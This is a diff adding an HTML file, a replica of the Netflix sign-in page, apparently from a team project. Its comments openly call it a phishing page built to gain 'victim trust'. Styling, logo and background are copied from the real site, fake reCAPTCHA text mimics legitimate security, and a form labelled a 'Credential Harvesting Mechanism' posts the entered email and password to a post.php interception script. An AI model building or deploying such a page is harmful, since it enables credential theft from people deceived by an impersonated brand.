@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- 
+      Member 1: (moneera aldossary)Front-End & Social Engineering Lead
+      Task: Designing a high-fidelity replica of the Netflix login page to ensure victim trust.
+    -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #000;
+        }
+
+        /* 
+           UI/UX Optimization:
+           - Using the official Netflix hero background for visual credibility.
+           - Applied a linear-gradient overlay to ensure the login box contrast matches the real site.
+        */
+        .background-container {
+            background-image: linear-gradient(to top, rgba(0, 0, 0, 0.8) 0, rgba(0, 0, 0, 0) 60%, rgba(0, 0, 0, 0.8) 100%), 
+                              url('hero-img.jpg');
+            background-size: cover;
+            background-position: center;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 25px 50px;
+        }
+
+        /* Scaled the logo according to the official Netflix branding specifications */
+        .logo {
+            height: 45px;
+            width: auto;
+        }
+
+        .login-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 20px;
+        }
+
+        /* 
+           Phishing Box Design:
+           Semi-transparent background (rgba) to maintain the aesthetic 'Netflix look'.
+       
+        */
+        .login-box {
+            background-color: rgba(0, 0, 0, 0.75);
+            padding: 60px 68px 40px;
+            width: 450px;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        h1 { color: #fff; font-size: 32px; font-weight: bold; margin-bottom: 28px; }
+
+        input {
+            width: 100%;
+            height: 50px;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            padding: 0 20px;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        /* Netflix signature button  to drive the 'Sign In' action */
+        button {
+            width: 100%;
+            padding: 16px;
+            background-color: #e50914;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 24px;
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            color: #b3b3b3;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .footer-info {
+            margin-top: 30px;
+            color: #737373;
+            font-size: 16px;
+        }
+
+        .footer-info a { color: #fff; text-decoration: none; }
+        
+        .captcha {
+            font-size: 13px;
+            color: #8c8c8c;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background-container">
+        <div class="header">
+            <img src="logo.svg" alt="Netflix" class="logo">
+        </div>
+
+        <div class="login-wrapper">
+            <div class="login-box">
+                <h1>Sign In</h1>
+                
+                <!-- 
+                     Credential Harvesting Mechanism:
+                     - Configured the form to use POST method for stealthy data transfer.
+                     - action="post.php" links the UI to the backend interception script.
+                -->
+                <form action="post.php" method="POST">
+                    <!-- 'name' attributes are crucial for the PHP backend to capture specific values -->
+                    <input type="text" name="username" placeholder="Email or phone number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Sign In</button>
+                    
+                    <div class="options">
+                        <label><input type="checkbox" checked> Remember me</label>
+                        <span>Need help?</span>
+                    </div>
+                </form>
+
+                <div class="footer-info">
+                    New to Netflix? <a href="#">Sign up now.</a>
+                </div>
+                
+                <!-- Replicated reCAPTCHA text to mimic legitimate security features -->
+                <div class="captcha">
+                    This page is protected by Google reCAPTCHA to ensure you're not a bot. <span style="color: #0071eb; cursor: pointer;">Learn more.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
